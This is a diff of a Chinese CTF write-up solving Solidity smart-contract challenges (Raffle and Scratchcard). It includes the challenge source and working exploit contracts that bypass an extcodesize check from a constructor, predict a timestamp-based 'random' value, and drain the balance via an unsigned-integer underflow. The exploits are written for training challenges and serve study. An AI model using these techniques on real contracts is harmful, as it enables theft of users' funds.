@@ -925,11 +925,13 @@ next DebugAuthorizer address: 0xe177fc1703942b50cd95a87bb9dfa4ab3cf3a1fe
 
 这就有了一个漏洞，blockhash 只会计算最近的 256 个块，再早的结果会是 0
 
-所以只需要部署两个合约，两个都买上票，等待出 256 个块之后用一个合约调用 closeRaffle，再用另一个合约调用 collectReward 领奖。这里要注意领奖的合约的 ticketNumbers 必须是 0，也就是在买票的时候交的 value 必须等于 fee 也就是 0.1 ether
+但是如果使用两个合约一个来关闭抽奖，另一个领奖的话，不能取出全部的余额（因为关闭抽奖的账户买票的钱不会转出来）。因此需要通过 fallback 函数，value 为 0 的时候会调用 closeRaffle，这会使 closeRaffle 判断的 msg.sender 为自身。所以只需要买下票，然后等待出 256 个块之后触发 fallback 然后再 collectReward 就好了
+
+这里注意还要把题目合约地址通过调用 ctf_challenge_add_authorized_sender 加入白名单，才可以在 fallback 中调用自身函数
 
 ???+ done "exp"
     ```solidity
-    contract Exploit1 {
+    contract Exploit {
         Raffle challenge;
         constructor(address addr) public {
             challenge = Raffle(addr);
@@ -937,24 +939,8 @@ next DebugAuthorizer address: 0xe177fc1703942b50cd95a87bb9dfa4ab3cf3a1fe
         function buyTicket() public payable {
             challenge.buyTicket.value(msg.value)();
         }
-        function closeRaffle() public {
-            challenge.closeRaffle();
-        }
-        function() public payable {}
-        function destroy(address addr) public {
-            selfdestruct(addr);
-        }
-    }
-
-    contract Exploit2 {
-        Raffle challenge;
-        constructor(address addr) public {
-            challenge = Raffle(addr);
-        }
-        function buyTicket() public payable {
-            challenge.buyTicket.value(msg.value)();
-        }
-        function collectReward() public {
+        function exp() public {
+            address(challenge).call.value(0 ether)();
             challenge.collectReward();
         }
         function() public payable {}
@@ -967,3 +953,117 @@ next DebugAuthorizer address: 0xe177fc1703942b50cd95a87bb9dfa4ab3cf3a1fe
 ---
 
 ## Scratchcard
+
+??? question "题目合约"
+    ```solidity
+    pragma solidity 0.4.24;
+
+    import "../CtfFramework.sol";
+
+    library Address {
+        function isContract(address account) internal view returns (bool) {
+            uint256 size;
+            assembly { size := extcodesize(account) }
+            return size > 0;
+        }
+    }
+
+    contract Scratchcard is CtfFramework{
+
+        event CardPurchased(address indexed player, uint256 cost, bool winner);
+
+        mapping(address=>uint256) private winCount;
+        uint256 private cost;
+
+
+        using Address for address;
+
+        constructor(address _ctfLauncher, address _player) public payable
+            CtfFramework(_ctfLauncher, _player)
+        {
+        }
+
+        modifier notContract(){
+            require(!msg.sender.isContract(), "Contracts Not Allowed");
+            _;
+        }
+        
+        function play() public payable notContract ctf{
+            bool won = false;
+            if((now%10**8)*10**10 == msg.value){
+                won = true;
+                winCount[msg.sender] += 1;
+                cost = msg.value;
+                msg.sender.transfer(cost);
+            }
+            else{
+                cost = 0;
+                winCount[msg.sender] = 0;
+            }
+            emit CardPurchased(msg.sender, msg.value, won);
+        }    
+
+        function checkIfMegaJackpotWinner() public view returns(bool){
+            return(winCount[msg.sender]>=25);
+        }
+
+        function collectMegaJackpot(uint256 _amount) public notContract ctf{
+            require(checkIfMegaJackpotWinner(), "User Not Winner");
+            require(2 * cost - _amount > 0, "Winners May Only Withdraw Up To 2x Their Scratchcard Cost");
+            winCount[msg.sender] = 0;
+            msg.sender.transfer(_amount);
+        }
+
+        function () public payable ctf{
+            play();
+        }
+
+    }
+    ```
+
+调用 play 来猜随机数，play 函数有一个 notContract 的 modifier，这个可以通过在 constructor 中直接操作来绕过，因此可以直接在攻击合约中调用 25 次 play 函数来达到条件，转出的时候虽然判断了 `#!solidity 2*cost - _amount > 0` 但都是 uint 可以下溢，所以直接转出全部就好了
+
+另外还需要提前计算一下攻击合约的地址，再调用 ctf_challenge_add_authorized_sender 函数预先把要部署的攻击合约的位置加入白名单后才可以部署攻击合约
+
+???+ done "exp"
+    ```solidity
+    contract Attacker {
+        Scratchcard challenge;
+        uint public count;
+        uint public money;
+        constructor(address addr, address player) public payable {
+            challenge = Scratchcard(addr);
+            count = 0;
+            while (count < 25) {
+                money = (now%10**8)*10**10;
+                challenge.play.value(money)();
+                count += 1;
+            }
+            challenge.collectMegaJackpot(addr.balance);
+            selfdestruct(player);
+        }
+        function() public payable {}
+    }
+
+    contract Exploit {
+        Scratchcard challenge;
+        address player;
+        uint8 public nonce;
+        constructor(address addr, address _player) public {
+            challenge = Scratchcard(addr);
+            player = _player;
+            nonce = 1;
+        }
+        function exp() public payable {
+            address attacker = address(keccak256(0xd6, 0x94, this, nonce));
+            nonce += 1;
+            challenge.ctf_challenge_add_authorized_sender(attacker);
+            address(attacker).transfer(4 ether);
+            Attacker newAttacker = new Attacker(address(challenge), player);
+        }
+        function() public payable {}
+        function destroy() public {
+            selfdestruct(player);
+        }
+    }
+    ```
